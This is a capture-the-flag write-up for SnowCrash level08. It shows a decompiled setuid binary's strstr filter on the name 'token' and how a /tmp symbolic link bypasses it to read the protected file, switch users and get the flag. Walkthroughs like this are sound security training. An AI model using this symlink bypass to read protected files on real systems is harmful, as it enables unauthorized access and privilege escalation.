We start by exploring the files and find two items: `level08` (an executable) and `token`

```
level08@SnowCrash:~$ ls
level08  token
```

Running `./level08` shows that it expects a file to read.

```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Attempting to read `token` directly returns an error:

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Disassembling the binary in Ghidra reveals the following logic:

```
int main(int argc,char **argv,char **envp)
{
  ...
  pcVar1 = strstr(in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
    exit(1);
  }
  __fd = open(in_stack_00000008[1],0);
  ...
}
```

1. **String Check with `strstr`**:

   - The program uses `strstr` to search for the string `"token"` in the provided file path.
   - If `"token"` is found in the file name, the program prints an error and exits.

2. **File Access Logic**:
   - If the file name does not contain `"token"`, the program opens and reads the file, displaying its contents.

To bypass the `strstr` check, we can create a symbolic link (`ln -sf`) to the `token` file with a different name.

1. **Creating the Symbolic Link**:
   - We create a symbolic link pointing to the `token` file but with a different name (`/tmp/tst`):

```
   level08@SnowCrash:~$ ln -sf ~/token /tmp/tst
```

2. **Executing the Exploit**:
   - Running `./level08 /tmp/tst` reads from the symbolic link, bypassing the `strstr` check on `"token"`.

```
   level08@SnowCrash:~$ ./level08 /tmp/tst
   quif5eloekouj29ke0vouxean
```

---

Using this token to switch users:

```
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
```

Once logged in, running `getflag` retrieves the flag:

```
flag08@SnowCrash:~$ getflag
Check flag.Here is your token :
```

This completes the exploit for Level08.
